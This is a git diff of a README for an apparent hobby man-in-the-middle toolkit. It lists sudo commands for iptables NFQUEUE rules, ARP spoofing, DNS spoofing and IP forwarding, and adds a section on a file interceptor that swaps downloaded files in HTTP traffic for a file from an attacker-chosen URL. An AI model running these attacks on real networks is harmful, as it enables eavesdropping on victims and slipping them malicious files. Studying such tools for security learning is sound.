@@ -98,11 +98,20 @@ In order to perform a MITM attack, a proxy needs to be created to divert the pac
     - Disable after attack is complete. - `sudo iptables -F`
 - Launch ARP Spoofer - `sudo python3 arp_spoofer.py -tip <target_ip> -rip <spoofed_ip>`
 - Launch DNS Spoofer - currently it will only redirect the request.
-`sudo python3 dns_spoofer.py -t <target_website> -r <redirecting_ip>`
--	Enable packet forwarding - `sudo sysctl -w net.ipv4.ip_forward=1`
-    -	Disable after attack is complete. `sudo sysctl -w net.ipv4.ip_forward=0`
+`sudo python dns_spoofer.py -t <target_website> -r <redirecting_ip>`
+- Enable packet forwarding - `sudo sysctl -w net.ipv4.ip_forward=1`
+    - Disable after attack is complete. `sudo sysctl -w net.ipv4.ip_forward=0`
 
 The DNS Spoofer window will output every successfull attack.
+
+
+**To replace a file in HTTP traffic**
+- Enable iptables FORWARD rule type NFQUEUE - `sudo iptables -I FORWARD -j NFQUEUE --queue-num 0`
+    - Disable after attack is complete. - `sudo iptables -F`
+- Launch ARP Spoofer - `sudo python3 arp_spoofer.py -tip <target_ip> -rip <spoofed_ip>`
+- Enable packet forwarding - `sudo sysctl -w net.ipv4.ip_forward=1`
+    - Disable after attack is complete. `sudo sysctl -w net.ipv4.ip_forward=0`
+- Launch File Interceptor - `sudo python file_interceptor.py -e <extension> -f <replacement file url>`
 
 
 ### Todo
